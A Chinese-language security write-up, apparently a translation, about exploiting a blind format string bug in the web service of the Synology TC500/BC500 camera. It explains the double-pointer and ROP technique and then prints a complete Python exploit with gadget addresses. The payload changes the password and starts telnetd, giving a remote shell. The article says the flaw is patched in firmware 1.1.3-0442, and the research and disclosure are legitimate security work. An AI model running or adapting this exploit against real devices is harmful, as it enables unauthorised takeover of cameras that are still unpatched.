#  利用现代二进制中的盲格式字符串漏洞：来自 2024 年 Pwn2Own 爱尔兰的案例研究   
Baptiste MOINE  securitainment   2024-11-09 11:52  
  
> Exploiting a Blind Format String Vulnerability in Modern Binaries A Case Study from Pwn2Own Ireland 2024  
  
  
在 2024 年 10 月，爱尔兰科克的 Pwn2Own 活动期间，黑客们针对多种硬件设备进行攻击，包括打印机、路由器、智能手机、家庭自动化系统、NAS 设备和安全摄像头等。本文重点介绍了一个在比赛前刚刚修复的复杂漏洞。尽管进行了及时修复，但该漏洞仍值得更多关注，而非被忽视。  
## 介绍  
  
在 2024 年 Pwn2Own 之前，这是一场以展示针对广泛使用的软件和设备的漏洞利用而闻名的著名黑客比赛。在此次比赛中，发现了运行在 ARM 32 位架构上的 Synology TC500 安全摄像头存在格式字符串漏洞。该漏洞源于一个 WEB 服务，具体是在解析 HTTP 请求的函数中，由于字符串格式化不当导致了该缺陷。  
  
尽管现代安全措施如_地址空间布局随机化_（ASLR）、位置无关可执行文件（PIE）、不可执行内存（NX）和_完全重定位只读_（Full RelRO）等已被实施，但该漏洞在特定条件下仍然可以被利用。  
  
利用该漏洞面临额外挑战：有效载荷限制为 128 个字符（其中部分字符保留给客户端 IP 地址），并且不允许使用一系列字符（从0x00到0x1F）。此外，在没有内存泄漏或无法查看客户端格式字符串输出的情况下，利用必须在盲目上下文中进行。  
  
易受攻击的代码片段如下：  
```
void mg_vsnprintf(const struct mg_connection *conn, int *truncated, char *buf, size_t buflen, const char *fmt, va_list ap) {
  int n;
  int ok;

  if ( buflen ) {
    n = vsnprintf(buf, buflen, fmt, ap);
    ok = (n & 0x80000000) == 0;
    if ( n >= buflen ) {
      ok = 0;
    }
    if ( ok ) {
      if ( truncated ) {
        *truncated = 0;
      }
      buf[n] = 0;
    } else {
      if ( truncated ) {
        *truncated = 1;
      }
      mg_cry(conn, "mg_vsnprintf", "truncating vsnprintf buffer: [%.*s]", (int)((buflen > 200) ? 200 : (buflen - 1)), buf);
      buf[n] = '\0';
    }
  } else if ( truncated ) {
    *truncated = 1;
  }
}

void mg_snprintf(const struct mg_connection *conn, int *truncated, char *buf, size_t buflen, const char *fmt, ...) {
  va_list ap;

  va_start(ap, fmt);
  mg_vsnprintf(conn, truncated, buf, buflen, fmt, ap);
}

void print_debug_msg(pthread_t thread_id, const char *fmt) {
  int i;

  if ( workerthreadcount > 0 ) {
    i = 0;
    do {
      if ( debug_table[i].tid == thread_id ) {
        mg_snprintf(0, 0, debug_table[i].buf, 0x80u, fmt);  // Uncontrolled format string.
        debug_table[i].buf[strlen(fmt)] = 0;
      }
      ++i;
    } while ( i < workerthreadcount );
  }
}

void parse_http_request(struct mg_request_info *conn) {
    pthread_t tid;
    char buf[0x80];

    /* [...] */
    tid = pthread_self();
    /* [...] */
    memset(buf, 0, sizeof(buf));
    mg_snprintf(0, 0, buf, 0x80u, "%s%s", hostname, conn->request_uri);  // Concat hostname to URI.
    if ( debug_table ) {
        print_debug_msg(tid, buf);
    }
    /* [...] */
}

```  
  
print_debug_msg 函数允许攻击者控制传递给 vsnprintf 的格式字符串，从而导致潜在的任意内存写入。本文概述了我们成功利用该格式字符串漏洞的过程，采用间接内存操作技术绕过现代安全措施，实现任意代码执行。  
## 挑战概述  
  
在利用过程中面临几个技术挑战：  
- **盲目利用：** 缺乏栈或基地址泄漏使我们无法获取内存布局信息。  
  
- **ASLR 和 PIE：** 这些机制随机化了二进制文件和库的地址，几乎不可能依赖固定地址来获取小工具或栈位置，而不影响稳定性。  
  
- **有效载荷限制：** 有效载荷限制为 128 个字符，且不能包含空字节或低 ASCII 字符（[0x00-0x1F]），进一步增加了利用的复杂性。  
  
鉴于这些限制，经典的基于栈的格式字符串利用方法变得不切实际。  
## 利用策略：盲格式字符串利用  
  
利用过程需要操控格式字符串以控制内存写入。关键技术是使用循环指针伪造一个受控的双栈指针，从而能够调整其指向以写入栈上的任意位置。  
## 1. 获得对栈的写入访问  
  
我们利用的第一步是获得对栈的任意写入访问。由于没有内存泄漏，我们必须进行盲目操作。我们找到一个可以修改的循环指针，使其指向栈中另一个包含有效栈指针的区域。通过改变其最低有效字节（LSB），我们创建了一个双指针，使得可以使用第一个指针修改第二个指针，有效地指向栈上的任意位置。这使我们能够在不需要知道确切地址的情况下，写入一个可预测的栈位置。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCO5MiaAibnxl9uIZA51EBDMSJXCg4mXjhIEDibFsrBmTe9My3fOYo5Xdwq5ibh3QNayMuO54DS0iaYpdkA/640?wx_fmt=png&from=appmsg "")  
  
栈上的循环指针  
## 2. 在栈上构建 ROP 链  
  
一旦获得对栈的任意写入访问，我们便开始在易受攻击函数的栈帧中未使用的空间内构建 ROP 链。该区域从未被触及，成为我们利用的理想位置。此外，它足够接近，可以通过栈调整小工具访问，从而允许我们执行 ROP 链。  
  
使用格式字符串说明符 %*X$c，我们可以读取特定栈偏移（例如返回地址）处的值，并将其存储在内部“字符计数器”中。随后，我们使用 %Y$c 格式说明符逐步调整该值，并使用 %Z$n 将其写回未使用的栈空间。这种技术使我们能够在构建 ROP 链的同时绕过 PIE 和 ASLR。  
  
仔细选择小工具至关重要，特别是那些出现在返回地址之后的小工具，以简化增量过程。  
```
ropper -f rootfs/bin/webd --nocolor --quality 1 --all | awk '{addr = strtonum($1)} addr > 0x28a5c'

```  
  
这种方法使我们能够逐步构建 ROP 链，具体步骤如下：  
- 我们调整栈指针链的最后一个指针，使其指向未使用栈空间中的小工具位置，使用 %916$hhn。  
  
- 通过使用 %*111$c 读取返回地址（偏移量可能因系统版本而异），并进行特定偏移量的修改，我们将小工具地址暂时存储在“字符计数器”中。  
  
- 然后，根据加法的结果，使用以下两种技术之一将字符计数器中的小工具地址写入未使用的栈空间：  
  
- 如果加法后最后 16 位没有溢出，我们使用 %924$hn 格式说明符覆盖未使用栈空间中返回地址副本的最后 16 位。  
  
- 如果加法导致 16 位值溢出，我们则使用 %924$n 直接一次性写入完整的小工具地址。这是可行的，因为代码基地址的值相对较低。  
  
> 尽管一次性写入可以用于任何小工具，但出于性能原因，我们旨在尽量减少其使用：ROP 小工具地址越高，写入时的内存占用越大。  
  
  
该过程重复进行，直到整个 ROP 链构建完成。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCO5MiaAibnxl9uIZA51EBDMSJdia7XYyBFQNKMHicgpJjGjnoia16kUw6PJZgagrqT5UexRcWa2fd60sXA/640?wx_fmt=png&from=appmsg "")  
  
伪栈布局  
## 3. 写入命令行  
  
在建立 ROP 链后，我们制作了执行最终命令所需的有效载荷。我们的目标是通过 system() 函数调用一个 shell 命令。  
  
由于有效载荷限制，我们使用多个请求逐字节地写入命令字符串，针对每个字符应用以下过程：  
- 我们调整栈指针链的最后一个指针，使其指向未使用栈空间中的字符位置。  
  
- 使用基本格式字符串，我们将字符计数器递增到目标字节值，然后通过我们控制的栈指针使用 %924$hhn 将其写入未使用栈空间中的指定位置。  
  
例如，我们逐字节地写入命令 sh${IFS}-c${IFS}'echo${IFS}synodebug:synodebug|chpasswd;telnetd'，通过格式字符串仔细控制内存写入。经过这个过程，命令已完全写入未使用的栈空间，准备执行。  
## 4. 完成利用：调整栈并执行 ROP 链  
  
最后一步涉及调整栈指针以执行我们准备好的 ROP 链。这是通过用一个修改栈指针的小工具覆盖返回地址来实现的，将其移至一个受控位置，ROP 链在此等待。  
  
一旦返回地址被修改，程序将重定向执行到我们的 ROP 链，最终调用 system()，并使用存储在内存中的命令。  
  
这是版本 1.1.2-0416 的最终利用版本。  
```
#!/usr/bin/env python3

import argparse
import urllib
import socket
import struct
import time

def get_args():
    def auto_int(x):
        return int(x, 0)

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-?", "--help", action="help", help="show this help message and exit")
    parser.add_argument("-t", "--timeout", help="Timeout while receiving response", default=5, type=float)
    parser.add_argument("-S", "--shost", help="Source host", type=str)
    parser.add_argument("-P", "--dport", help="Remote port", default=80, type=int)
    parser.add_argument("-H", "--dhost", help="Remote host", default="192.168.15.91", type=str)

    args = parser.parse_args()

    return args

class Exploit():
    def __init__(self, shost, dhost, dport):
        self.prefix_padding_size = 16
        self.dhost = dhost
        self.dport = dport
        self.sock = self.connect()
        if not self.sock:
            exit(0)
        if shost:
            self.local_ip = shost
        else:
            self.local_ip = self.sock.getsockname()[0]

    def disconnect(self):
        self.sock.close()
        self.sock = None

    def connect(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(None)
            sock.connect((self.dhost, self.dport))
            return sock
        except Exception as e:
            return None

    def send_payload(self, payload):
        try:
            if not self.sock:
                self.sock = self.connect()
                if not self.sock:
                    exit(0)
            self.sock.send(payload)
            resp = self.sock.recv(4096)
        except Exception as e:
            pass
        self.disconnect()

    def prepare_payload(self, raw_payload, payload_char=0x42):
        """        Append padding to the payload and check for bad chars.        """
        assert not (self.local_ip is None)
        assert not (any(c in raw_payload for c in range(0, 0x21)))
        url  = self.local_ip.encode().ljust(self.prefix_padding_size, b"B")[len(self.local_ip):]
        url += raw_payload
        payload  = b"AAAA "  # HTTP verb
        payload += url.ljust(115, bytes([payload_char]))  # make sure we trigger the truncation
        payload += b" CCCC\r\n\r\n"  # HTTP version
        return payload

    def stage_0(self):
        """        Craft a double stack pointer from a looping one.        The looping pointer is at offset 916, we make it point to the offset 924.        The pointer at offset 924 is pointing to the offset 153.        """
        print("[+] Crafting a double stack pointer...")

        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += f"%{0xe0 - (len(raw_payload) + self.prefix_padding_size)}c".encode()
        raw_payload += b"%916$hhn"  # overwrite the LSB of the looping pointer.
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def point_to_fake_stack(self, stack_offset, shift=0):
        """        Make our controlled stack pointer at offset 924 pointing to our fake stack at a given offset.        """
        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += f"%{0x50 + ((stack_offset*4) + shift) - (len(raw_payload) + self.prefix_padding_size)}c".encode()
        raw_payload += b"%916$hhn"
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def point_to_ret_addr(self):
        """        Make our controlled stack pointer at offset 924 pointing to our return address (offset 111).        """
        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += f"%{0x12c - (len(raw_payload) + self.prefix_padding_size)}c".encode()
        raw_payload += b"%916$hhn"
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def copy_ret_addr_to_ptr(self):
        """        Copy the return address to the controlled stack pointer at offset 924.        """
        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += b"%*111$c"
        raw_payload += b"%924$n"
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def write_webd_gagdet_to_fake_stack(self, gadget_offset, stack_offset):
        """        Write WEBD gadget to our fake stack at a given offset.        """
        origin_ret_addr = 0x28a5c

        assert not (gadget_offset < origin_ret_addr & ((1<<16)-1))

        self.point_to_fake_stack(stack_offset)

        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += b"%*111$c"   # we use the return address as a reference to our gadget.

        if gadget_offset - (origin_ret_addr + (len(raw_payload) + self.prefix_padding_size)) > 0:  # check if we can just increment the return address.
            offset = gadget_offset - (origin_ret_addr + (len(raw_payload) + self.prefix_padding_size))
            str_offset = str(offset+len("%999999")).ljust(len("999999") - 2, "c")
            raw_payload += f"%{str_offset}c".encode()
            raw_payload += b"%924$n"
        else:  # or if we need to overwrite the last two bytes of the return address.
            self.copy_ret_addr_to_ptr()
            offset = (gadget_offset & ((1<<16)-1) | 1 << 16) - (origin_ret_addr & ((1<<16)-1)) - (len(raw_payload) + self.prefix_padding_size)
            str_offset = str(offset+len("%999999")).ljust(len("999999") - 2, "c")
            raw_payload += f"%{str_offset}c".encode()
            raw_payload += b"%924$hn"

        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def write_byte_to_fake_stack(self, value, stack_offset, value_offset):
        """        Overwrite one byte value of our fake stack at a given offset and index.        """
        origin_ret_addr = 0x28a5c

        assert not (value >> 31 == 1)  # can't write signed value in one shot.

        self.point_to_fake_stack(stack_offset, value_offset)

        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        offset = ((1<<8) | value) - (len(raw_payload) + self.prefix_padding_size)
        raw_payload += f"%{str(offset)}c".encode()
        raw_payload += b"%924$hhn"
        payload = self.prepare_payload(raw_payload, payload_char=value)
        self.send_payload(payload)

    def stage_1(self):
        """        Prepare our fake stack.               +------ fake stack offset               |   +-- format string offset               V   V        0000: |00│120│ add_sp_20h_pop5-fmt_offset // r4: prepare the return address value before overwriting saved pc.        0004: |01│121│ junk                       // r5        0008: |02│122│ junk                       // r6        000c: |03│123│ junk                       // r7        0010: |04│124│ junk                       // r8        0014: |05│125│ pop_r3                     // pc: just to control the next blx r3.        0018: |06│126│ pop_r4_r5                  // r3        001c: |07│127│ add_r1_sp_18h_blx_r3       // pc: r1 points to the offset 0x38        0020: |08│128│ junk                       // r4        0024: |09│129│ junk                       // r5        0028: |10│130│ pop_r3                     // pc        002c: |11│131│ bl_system                  // r3        0030: |12│132│ mov_r0_r1_blx_r3           // pc: make r0 pointing to our payload        0034: |13│133│ junk        0038: |14│134│ "sh${IFS}-c${IFS}'echo${IFS}synodebug:synodebug|chpasswd;telnetd'"        """
        print("[+] Building a fake stack...")

        add_sp_20h_pop5       = 0x000294bc  # add sp, sp, #0x20; pop {r4, r5, r6, r7, r8, pc};
        pop_r3                = 0x000a8824  # pop {r3, pc}
        add_r1_sp_18h_blx_r3  = 0x00042bd0  # add r1, sp, #0x18; add r0, r4, #8; blx r3;
        bl_system             = 0x00025ddc  # bl system
        mov_r0_r1_blx_r3      = 0x0003fd5c  # mov r0, r1; blx r3;
        pop_r4_r5             = 0x0003f5dc  # pop {r4, r5, pc};

        self.write_webd_gagdet_to_fake_stack(gadget_offset=add_sp_20h_pop5-24, stack_offset=0)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=pop_r3, stack_offset=5)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=pop_r4_r5, stack_offset=6)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=add_r1_sp_18h_blx_r3, stack_offset=7)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=pop_r3, stack_offset=10)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=bl_system, stack_offset=11)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=mov_r0_r1_blx_r3, stack_offset=12)

        cmd = b"sh${IFS}-c${IFS}'echo${IFS}synodebug:synodebug|chpasswd;telnetd'"
        for i, char in enumerate(cmd):
            stack_offset=(14+(i//4))  # 14 is the offset of our command string inside our fake stack.
            self.write_byte_to_fake_stack(value=char, stack_offset=stack_offset, value_offset=i%4)

    def stage_2(self):
        """        Overwrite the return address with the value stored at the offset 0 of our fake stack (offset 120).        """
        print("[+] Overwriting PC...")

        self.point_to_ret_addr()

        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += b"%*120$c"   # we use our fake stack value.
        raw_payload += b"%924$n"
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

def main(args):
    exploit = Exploit(args.shost, args.dhost, args.dport)
    exploit.stage_0()
    exploit.stage_1()
    exploit.stage_2()

    print("[+] Woot!")

if __name__ == "__main__":
    args = get_args()
    main(args)

```  
## 结论  
  
该漏洞利用展示了格式字符串漏洞如何在特定格式字符串说明符的配合下，成功绕过现代防御机制，如地址空间布局随机化（ASLR）和位置无关可执行文件（PIE）。通过利用循环指针对栈的写入控制，我们构建了一个功能性 ROP 链，而无需依赖直接的内存泄漏或暴力破解方法。  
  
此漏洞影响了版本为1.1.1-0383的 Synology TC500 和 BC500 摄像头，并在版本1.1.3-0442中得到修复（详见更新日志），这意味着该漏洞利用在 Pwn2Own 比赛期间无法执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCO5MiaAibnxl9uIZA51EBDMSJlaSiazS3pFxvKPRr9vjJzMc5Zf7OBhzcnpTrl05kcHROUBaeek9v0qg/640?wx_fmt=png&from=appmsg "")  
  
Synology TC500 安全摄像头的远程代码执行  
  
